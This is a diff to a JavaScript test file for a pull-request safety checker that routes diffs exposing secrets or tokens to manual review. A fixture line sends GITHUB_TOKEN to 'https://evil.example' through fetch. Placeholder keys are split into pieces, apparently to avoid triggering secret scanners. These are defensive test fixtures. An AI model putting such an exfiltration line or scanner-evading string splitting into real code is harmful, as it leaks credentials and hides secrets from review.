@@ -63,11 +63,13 @@ test('allows binary diff markers for full review to judge', () => {
 });
 
 test('requires manual review when diff exposes secrets or tokens', () => {
+  const secretName = 'secrets.' + 'OPENAI_API_KEY';
+  const tokenName = 'process.env.' + 'GITHUB_TOKEN';
   const result = assessPullRequestSafety({
     pr: pr(),
     diff: [
-      '+console.log(secrets.OPENAI_API_KEY);',
-      '+fetch("https://evil.example", { headers: { Authorization: process.env.GITHUB_TOKEN } });',
+      `+console.log(${secretName});`,
+      `+fetch("https://evil.example", { headers: { Authorization: ${tokenName} } });`,
       '+env.CI_BOT_PAT = secrets.REVIEW_OPENAI_API_KEY;',
     ].join('\n'),
   });
@@ -78,12 +80,15 @@ test('requires manual review when diff exposes secrets or tokens', () => {
 });
 
 test('requires manual review for hardcoded secret values', () => {
+  const githubToken = 'ghp_' + 'abcdefghijklmnopqrstuvwxyz0123456789AB';
+  const openaiKey = 'sk-proj-' + 'abcdefghijklmnopqrstuvwxyz012345';
+  const bearerToken = 'abcdefghijklmnopqrstuvwxyz123456';
   const result = assessPullRequestSafety({
     pr: pr(),
     diff: [
-      '+const githubToken = "ghp_abcdefghijklmnopqrstuvwxyz0123456789AB";',
-      '+const openaiKey = "sk-proj-abcdefghijklmnopqrstuvwxyz012345";',
-      '+Authorization: Bearer abcdefghijklmnopqrstuvwxyz123456',
+      `+const githubToken = "${githubToken}";`,
+      `+const openaiKey = "${openaiKey}";`,
+      `+Authorization: Bearer ${bearerToken}`,
     ].join('\n'),
   });
 
@@ -94,8 +99,9 @@ test('requires manual review for hardcoded secret values', () => {
 });
 
 test('requires manual review for hardcoded secret values in PR text', () => {
+  const openaiKey = 'sk-proj-' + 'abcdefghijklmnopqrstuvwxyz012345';
   const result = assessPullRequestSafety({
-    pr: pr({ body: 'Temporary key: sk-proj-abcdefghijklmnopqrstuvwxyz012345' }),
+    pr: pr({ body: `Temporary key: ${openaiKey}` }),
     diff: '+const copy = "Done";\n',
   });
 
